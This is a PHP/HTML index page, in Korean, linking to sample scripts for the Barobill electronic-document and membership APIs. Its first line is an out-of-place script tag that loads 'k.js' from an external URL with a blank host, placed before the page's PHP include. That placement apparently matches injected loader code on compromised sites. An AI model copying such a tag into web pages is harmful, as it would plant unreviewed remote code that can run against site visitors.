<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>전자문서 관련 API</legend>
	<fieldset class="fieldset2">
		<legend>문서 프로세스</legend>
		<ul>
			<li><a href="API_EDOC/RegistEDoc.php">RegistEDoc</a> - 등록</li>
			<li><a href="API_EDOC/UpdateEDoc.php">UpdateEDoc</a> - 수정</li>
			<li><a href="API_EDOC/IssueEDoc.php">IssueEDoc</a> - 발행</li>
			<li><a href="API_EDOC/CancelEDoc.php">CancelEDoc</a> - 발행취소</li>
			<li><a href="API_EDOC/DeleteEDoc.php">DeleteEDoc</a> - 삭제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>첨부파일</legend>
		<ul>
			<li><a href="API_EDOC/GetAttachedFileList.php">GetAttachedFileList</a> - 첨부파일 목록</li>
			<li><a href="API_EDOC/AttachFileByFTP.php">AttachFileByFTP</a> - 파일 첨부</li>
			<li><a href="API_EDOC/DeleteAttachFileWithFileIndex.php">DeleteAttachFileWithFileIndex</a> - 첨부파일 삭제</li>
			<li><a href="API_EDOC/DeleteAttachFile.php">DeleteAttachFile</a> - 첨부파일 전체삭제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 연결</legend>
		<ul>
			<li><a href="API_EDOC/GetLinkedDocs.php">GetLinkedDocs</a> - 연결된 문서 목록</li>
			<li><a href="API_EDOC/MakeDocLinkage.php">MakeDocLinkage</a> - 문서 연결</li>
			<li><a href="API_EDOC/RemoveDocLinkage.php">RemoveDocLinkage</a> - 문서 연결 해제</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>문서 정보</legend>
		<ul>
			<li><a href="API_EDOC/GetEDoc.php">GetEDoc</a> - 문서 정보</li>
			<li><a href="API_EDOC/GetEDocLog.php">GetEDocLog</a> - 문서 이력</li>
			<li><a href="API_EDOC/GetEDocState.php">GetEDocState</a> - 문서 상태</li>
			<li><a href="API_EDOC/GetEDocStates.php">GetEDocStates</a> - 문서 상태(대량, 100건 까지)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>부가서비스</legend>
		<ul>
			<li><a href="API_EDOC/SendEmail.php">SendEmail</a> - 이메일 전송</li>
			<li><a href="API_EDOC/SendSMS.php">SendSMS</a> - 문자 전송</li>
			<li><a href="API_EDOC/SendFax.php">SendFax</a> - 팩스 전송</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_EDOC/CheckMgtKeyIsExists.php">CheckMgtKeyIsExists</a> - 연동사부여 문서키 사용여부 확인</li>
			<li><a href="API_EDOC/GetEDocPopUpURL.php">GetEDocPopUpURL</a> - 문서 내용보기 팝업 URL</li>
			<li><a href="API_EDOC/GetEDocPrintURL.php">GetEDocPrintURL</a> - 인쇄 팝업 URL</li>
			<li><a href="API_EDOC/GetEDocsPrintURL.php">GetEDocsPrintURL</a> - 대량인쇄 팝업 URL</li>
			<li><a href="API_EDOC/GetEDocMailURL.php">GetEDocMailURL</a> - 이메일의 보기버튼 URL</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>포인트 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBalanceCostAmount.php">GetBalanceCostAmount</a> - 잔여포인트 확인</li>
			<li><a href="API_BAROBILL/GetBalanceCostAmountOfInterOP.php">GetBalanceCostAmountOfInterOP</a> - 연동사포인트 확인</li>
			<li><a href="API_BAROBILL/GetChargeUnitCost.php">GetChargeUnitCost</a> - 요금 단가 확인</li>
			<li><a href="API_BAROBILL/CheckChargeable.php">CheckChargeable</a> - 과금 가능여부 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>공인인증서 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetCertificateRegistURL.php">GetCertificateRegistURL</a></a> - 공인인증서 등록 URL</li>
			<li><a href="API_BAROBILL/GetCertificateExpireDate.php">GetCertificateExpireDate</a></a> - 등록한 공인인증서 만료일 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend style="color:red;">문자 발신번호 등록</legend>
		<ul>
			<li><a href="API_BAROBILL/RegistSMSFromNumber.php">RegistSMSFromNumber</a></a> - 발신번호 추가</li>
			<li><a href="API_BAROBILL/CheckSMSFromNumber.php">CheckSMSFromNumber</a></a> - 발신번호 확인</li>
			<li><a href="API_BAROBILL/GetSMSFromNumberURL.php">GetSMSFromNumberURL</a></a> - 발신번호 관리 URL</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>